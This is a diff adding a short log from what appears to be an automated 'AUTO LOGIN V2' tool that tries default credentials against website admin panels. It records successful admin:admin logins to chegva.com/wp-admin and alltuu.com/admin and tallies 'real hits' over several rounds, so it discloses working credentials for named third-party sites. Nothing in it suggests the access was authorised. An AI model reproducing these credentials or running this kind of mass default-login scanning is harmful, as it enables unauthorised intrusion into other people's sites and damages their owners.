@@ -1,0 +1,15 @@
+[03:14:42] ========================================
+[03:14:42] AUTO LOGIN V2 — REAL VERIFICATION
+[03:15:03] [!] REAL LOGIN: chegva.com admin:admin -> https://chegva.com/wp-admin/
+[03:15:25] [!] REAL LOGIN: alltuu.com admin:admin -> http://alltuu.com/admin
+[03:19:39] Round 5: 2 real hits so far
+[03:24:39] Round 10: 2 real hits so far
+[03:30:53] ========================================
+[03:30:53] AUTO LOGIN V2 — REAL VERIFICATION
+[03:31:27] [!] REAL LOGIN: alltuu.com admin:admin -> http://alltuu.com/admin
+[03:35:32] Round 5: 1 real hits so far
+[03:40:34] Round 10: 1 real hits so far
+[03:45:41] Round 15: 1 real hits so far
+[03:50:39] Round 20: 1 real hits so far
+[03:50:39] FINAL: 1 real hits
+[03:50:39]   http://alltuu.com/admin
